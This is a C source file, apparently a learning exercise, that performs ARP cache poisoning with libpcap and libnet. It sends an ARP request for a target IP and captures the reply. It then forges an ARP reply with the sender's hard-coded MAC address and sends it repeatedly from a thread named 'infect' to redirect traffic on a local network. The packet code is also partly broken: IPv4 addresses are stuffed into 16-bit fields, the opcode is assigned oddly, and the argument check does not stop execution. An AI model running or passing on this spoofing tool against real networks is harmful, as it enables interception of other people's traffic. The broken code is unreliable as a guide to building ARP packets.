#include <pcap/pcap.h>
#include <libnet.h>
#include <stdio.h>
#include <string.h>
#include <pthread.h>

struct libnet_arp_hdr_Saewook
{
    uint16_t ar_hrd;         /* format of hardware address */
#define ARPHRD_NETROM   0   /* from KA9Q: NET/ROM pseudo */
#define ARPHRD_ETHER    1   /* Ethernet 10Mbps */
#define ARPHRD_EETHER   2   /* Experimental Ethernet */
#define ARPHRD_AX25     3   /* AX.25 Level 2 */
#define ARPHRD_PRONET   4   /* PROnet token ring */
#define ARPHRD_CHAOS    5   /* Chaosnet */
#define ARPHRD_IEEE802  6   /* IEEE 802.2 Ethernet/TR/TB */
#define ARPHRD_ARCNET   7   /* ARCnet */
#define ARPHRD_APPLETLK 8   /* APPLEtalk */
#define ARPHRD_LANSTAR  9   /* Lanstar */
#define ARPHRD_DLCI     15  /* Frame Relay DLCI */
#define ARPHRD_ATM      19  /* ATM */
#define ARPHRD_METRICOM 23  /* Metricom STRIP (new IANA id) */
#define ARPHRD_IPSEC    31  /* IPsec tunnel */
    uint16_t ar_pro;         /* format of protocol address */
    uint8_t  ar_hln;         /* length of hardware address */
    uint8_t  ar_pln;         /* length of protocol addres */
    uint16_t ar_op;          /* operation type */
#define ARPOP_REQUEST    1  /* req to resolve address */
#define ARPOP_REPLY      2  /* resp to previous request */
#define ARPOP_REVREQUEST 3  /* req protocol address given hardware */
#define ARPOP_REVREPLY   4  /* resp giving protocol address */
#define ARPOP_INVREQUEST 8  /* req to identify peer */
#define ARPOP_INVREPLY   9  /* resp identifying peer */
    /* address information allocated dynamically */

    uint8_t sender_HA[ETHER_ADDR_LEN];         /* attack of hardware address */
    uint16_t sender_ip[2];
    uint8_t target_HA[ETHER_ADDR_LEN];         /* victim of hardware address */
    uint16_t target_ip[2];
    uint8_t padding[18];
};

typedef struct tTHREAD
{
    pcap_t *handle; /* Session handle */
    u_char *send_buf;
    int size;
}THREAD;

void *infect(void *data)
{
    THREAD* PP = (THREAD*)data;
    pcap_t *handle = PP -> handle;
    u_char *send_buf =  PP -> send_buf;
    int i;
    for(i = 0; i < 5; i++)
    {
    pcap_sendpacket(handle, (u_char*)send_buf, (sizeof(libnet_ethernet_hdr) + sizeof(libnet_arp_hdr_Saewook)));
    sleep(1);
    }

    printf("The End of Infect packet");
    return 0;
}

int main(int argc, char **argv)

{
    char *dev, errbuf[PCAP_ERRBUF_SIZE]; /* The device to sniff on, Error string */

    /* Define the device */
    dev = pcap_lookupdev(errbuf); //find the dev
    if (dev == NULL) {
        fprintf(stderr, "Couldn't find default device: %s\n", errbuf);
        return(2);
    }
    printf("Device: %s\n", dev);

    pcap_t *handle; /* Session handle */

    /* Open the session in promiscuous mode */
      handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf); // dev session open
      if (handle == NULL) {
          fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
          return(2);
      }

      if(argc != 3)
      {
          printf("Usage: %s <Sender ip>  <receiver ip>", argv[0]);
      }

      u_char send_buf[sizeof(libnet_ethernet_hdr) + sizeof(libnet_arp_hdr_Saewook)] =  {0,};
      libnet_ethernet_hdr* eth_hdr = (libnet_ethernet_hdr*)send_buf;

      //requset place

      // eth_hdr setting place
      // Destination Mac address

      send_buf[0] = 0xFF;
      send_buf[1] = 0xFF;
      send_buf[2] = 0xFF;
      send_buf[3] = 0xFF;
      send_buf[4] = 0xFF;
      send_buf[5] = 0xFF;

      // Source Mac address
      send_buf[6] = 0x00;
      send_buf[7] = 0x0C;
      send_buf[8] = 0x29;
      send_buf[9] = 0xe1;
      send_buf[10] = 0xaa;
      send_buf[11] = 0x9a;

      eth_hdr -> ether_type = htons(ETHERTYPE_ARP); // send_buf[12] = 0x08, send_buf[13] = 0x06)

      libnet_arp_hdr_Saewook* arp_hdr = (libnet_arp_hdr_Saewook*)(send_buf + sizeof(libnet_ethernet_hdr));
          arp_hdr -> ar_hrd = htons(ARPHRD_ETHER); // send_buf[14] = 0x00, send_buf[15] = 0x01
          arp_hdr -> ar_pro = htons(ETHERTYPE_IP); // send_buf[16] = 0x08, send_buf[17] = 0x00
          arp_hdr -> ar_hln = 0x06; // send_buf[18] = 0x06;
          arp_hdr -> ar_pln = 0x04; // send_buf[19] = 0x04;
          arp_hdr -> ar_op = htons(ARPOP_REQUEST); //send_buf[20] = 0x01, send_buf[21] = 0x00

          arp_hdr -> sender_HA[0] = send_buf[6]; //send_buf[22]
          arp_hdr -> sender_HA[1] = send_buf[7]; //send_buf[23]
          arp_hdr -> sender_HA[2] = send_buf[8]; //send_buf[24]
          arp_hdr -> sender_HA[3] = send_buf[9]; //send_buf[25]
          arp_hdr -> sender_HA[4] = send_buf[10]; //send_buf[26]
          arp_hdr -> sender_HA[5] = send_buf[11]; //send_buf[27]

          //printf("%02X", htonl(inet_addr(argv[1]))); // dec -> hex;


          uint32_t sdr_ip_hex;
          sdr_ip_hex = htonl(inet_addr(argv[1]));
          printf("%X\n", sdr_ip_hex); //send_buf[28, 29, 30, 31]

          arp_hdr -> sender_ip[0] = htonl(sdr_ip_hex);
          arp_hdr -> sender_ip[1] = htons(sdr_ip_hex);

          arp_hdr -> target_HA[0] = 0x00; //send_buf[32]
          arp_hdr -> target_HA[1] = 0x00; //send_buf[33]
          arp_hdr -> target_HA[2] = 0x00; //send_buf[34]
          arp_hdr -> target_HA[3] = 0x00; //send_buf[35]
          arp_hdr -> target_HA[4] = 0x00; //send_buf[36]
          arp_hdr -> target_HA[5] = 0x00; //se  nd_buf[37]

          uint32_t dst_ip_hex;
          dst_ip_hex = htonl(inet_addr(argv[2]));
          printf("%X\n", dst_ip_hex);

          arp_hdr -> target_ip[0] = htonl(dst_ip_hex);
          arp_hdr -> target_ip[1] = htons(dst_ip_hex);

          pcap_sendpacket(handle, (u_char*)send_buf, (sizeof(libnet_ethernet_hdr) + sizeof(libnet_arp_hdr_Saewook)));

          // ---- reply infection ---- //

          struct pcap_pkthdr *h;
          const u_char * p;
          int res = pcap_next_ex(handle, &h, &p);
          //if(res == 0){printf("No packet is sniffed..!!");break;}
          //if(res == -1) break;

          struct libnet_ethernet_hdr *ehP = (struct libnet_ethernet_hdr *)p;
          send_buf[0] = ehP->ether_shost[0];
          send_buf[1] = ehP->ether_shost[1];
          send_buf[2] = ehP->ether_shost[2];
          send_buf[3] = ehP->ether_shost[3];
          send_buf[4] = ehP->ether_shost[4];
          send_buf[5] = ehP->ether_shost[5];

          send_buf[6] = ehP->ether_dhost[0];
          send_buf[7] = ehP->ether_dhost[1];
          send_buf[8] = ehP->ether_dhost[2];
          send_buf[9] = ehP->ether_dhost[3];
          send_buf[10] = ehP->ether_dhost[4];
          send_buf[11] = ehP->ether_dhost[5];


          struct libnet_arp_hdr_Saewook *ARP;
          ARP = (struct libnet_arp_hdr_Saewook*)(p + sizeof(*ehP));
          arp_hdr -> ar_op = ntohs((ARP -> ar_op) = ARPOP_REPLY);

          arp_hdr -> sender_HA[0] = send_buf[6];
          arp_hdr -> sender_HA[1] = send_buf[7];
          arp_hdr -> sender_HA[2] = send_buf[8];
          arp_hdr -> sender_HA[3] = send_buf[9];
          arp_hdr -> sender_HA[4] = send_buf[10];
          arp_hdr -> sender_HA[5] = send_buf[11];

          arp_hdr -> target_HA[0] = ARP -> sender_HA[0];
          arp_hdr -> target_HA[1] = ARP -> sender_HA[1];
          arp_hdr -> target_HA[2] = ARP -> sender_HA[2];
          arp_hdr -> target_HA[3] = ARP -> sender_HA[3];
          arp_hdr -> target_HA[4] = ARP -> sender_HA[4];
          arp_hdr -> target_HA[5] = ARP -> sender_HA[5];

          //-- reply packet to gateway --//


          pthread_t thread_t[2];
          THREAD st;
          st.handle = handle;
          st.send_buf = (u_char*)send_buf;
          st.size = (sizeof(libnet_ethernet_hdr) + sizeof(libnet_arp_hdr_Saewook));

          int status;
          int tid;

          tid = pthread_create(&thread_t[0], NULL, infect, (void *)&st);
          if(tid < 0)
          {
              printf("Can't Create Thread...!!");
              exit(0);
          }
          pthread_join(thread_t[0], (void **)&status);

          printf("\n                  ** eth0 **\n");
          printf("      Source MAC     ->  Destination MAC\n");
          printf("   %02X:%02X:%02X:%02X:%02X:%02X -> %02X:%02X:%02X:%02X:%02X:%02X\n\n\n",
                                                ehP->ether_shost[0],
                                                ehP->ether_shost[1],
                                                ehP->ether_shost[2],
                                                ehP->ether_shost[3],
                                                ehP->ether_shost[4],
                                                ehP->ether_shost[5],
                                                ehP->ether_dhost[0],
                                                ehP->ether_dhost[1],
                                                ehP->ether_dhost[2],
                                                ehP->ether_dhost[3],
                                                ehP->ether_dhost[4],
                                                ehP->ether_dhost[5]);

          //tid = pthread_create(&thread_t[1], NULL, reply, (void *)&st);
          //pthread_join(thread_t[1], (void **)&status);
          return 0;

}


